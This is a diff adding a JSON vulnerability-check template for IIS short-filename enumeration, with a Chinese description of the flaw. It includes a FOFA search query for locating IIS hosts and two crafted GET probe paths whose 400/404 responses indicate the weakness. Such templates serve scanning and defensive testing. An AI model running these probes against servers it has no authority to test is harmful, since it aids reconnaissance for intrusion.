@@ -1,0 +1,50 @@
+{
+  "product": "IIS",
+  "vul_name": "IIS 短文件名枚举",
+  "type": "解析漏洞",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。黑客可通过该漏洞尝试获取网站服务器下存放文件的文件名，达到获取更多信息来入侵服务器的目的。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"IIS\""
+  },
+  "protocol": "http",
+  "link": "https://blog.51cto.com/u_15061931/4319641",
+  "fix": [],
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/ttt*~1*/a.aspx"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 400
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/*~1*/a.aspx"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 404
+          }
+        ]
+      }
+    }
+  ]
+}
